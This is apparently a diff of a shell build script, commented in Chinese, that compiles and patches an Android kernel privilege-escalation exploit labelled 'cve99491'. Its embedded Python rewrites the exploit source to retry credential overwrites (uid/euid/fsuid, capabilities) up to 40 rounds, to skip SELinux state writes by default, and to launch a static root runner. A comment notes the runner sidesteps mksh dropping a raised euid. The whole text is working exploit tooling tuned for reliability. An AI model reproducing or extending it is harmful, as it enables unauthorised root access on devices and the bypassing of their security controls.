@@ -81,7 +81,6 @@ grep -E "^#define[[:space:]]+(LINK_|CRED_SITE|BLOB_SITE)" "$T/ctest.c" | sed 's/
 # —— 策略补丁 ——
 # 默认路径（不设 C99491_PERMISSIVE）完全不写 selinux_state：
 # 实测在 Enforcing 下往 selinux_state 写会卡死设备。
-# 命中次数已在本地用 node 数过。
 python3 - "$T/ctest.c" <<'PY'
 import io
 import re
@@ -105,7 +104,7 @@ src = sub_n(
     1,
 )
 
-# 2) patch_agent 的重试轮数 10 -> 40（实测 10 轮内 uid/euid/fsuid 经常全 miss）
+# 2) patch_agent 重试轮数 10 -> 40（实测 10 轮内经常全 miss）
 src = sub_n(
     src,
     "    for (int r = 0; r < 10; r++) {\n        long t0 = now_ms();\n",
@@ -132,12 +131,13 @@ src, n = re.subn(
 if n != 2:
     raise SystemExit("补丁失败：initialized 写期望 2 次，实际 %d 次" % n)
 
-# 5) 装载方式：手工符号表 -> ksud late-load
+# 5) 装载方式：手工符号表 -> 直接跑我们的静态 runner
+#    不能经 sh：mksh 在 euid != uid 时会 setuid(getuid()) 把 euid 降回去。
 src = sub_n(
     src,
     "        int n = snprintf(c, sizeof(c), \"loadksu %#llx allow_shell=1\\n\", slide);",
-    "        int n = snprintf(c, sizeof(c), \"run /data/local/tmp/ksud_go.sh\\n\");",
-    "loadksu -> run ksud_go.sh",
+    "        int n = snprintf(c, sizeof(c), \"run /data/local/tmp/c99491_run\\n\");",
+    "loadksu -> run c99491_run",
     2,
 )
 
@@ -151,7 +151,7 @@ src = sub_n(
 )
 
 io.open(path, "w", encoding="utf-8").write(src)
-print("策略补丁已应用：root+caps(40轮) / 不写 selinux_state / ksud 装载")
+print("策略补丁已应用：root+caps(40轮) / 不写 selinux_state / 跑 c99491_run")
 PY
 
 # —— Android system_properties 垫片 ——
@@ -196,6 +196,7 @@ build() {
 }
 
 build site_probe "$ROOT/plant/cve99491/site_probe.c"
+build c99491_run "$ROOT/plant/cve99491/c99491_run.c"
 build wtest      "$T/wtest.c"
 build ctest      "$T/ctest.c"
 build agent      "$T/agent.c"
@@ -212,7 +213,7 @@ build tinycred   "$T/tinycred.c"
   echo "cred_site_low21=$CRED_SITE"
   echo "blob_site_a=$BLOB_A"
   echo "blob_site_b=$BLOB_B"
-  echo "patches=root+caps40,patch_agent40,no-selinux-write,ksud-load"
+  echo "patches=root+caps40,patch_agent40,no-selinux-write,c99491_run"
   echo "built_at=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
   for f in "$OUT"/*; do
     case "$f" in *.b64|*.txt) continue;; esac
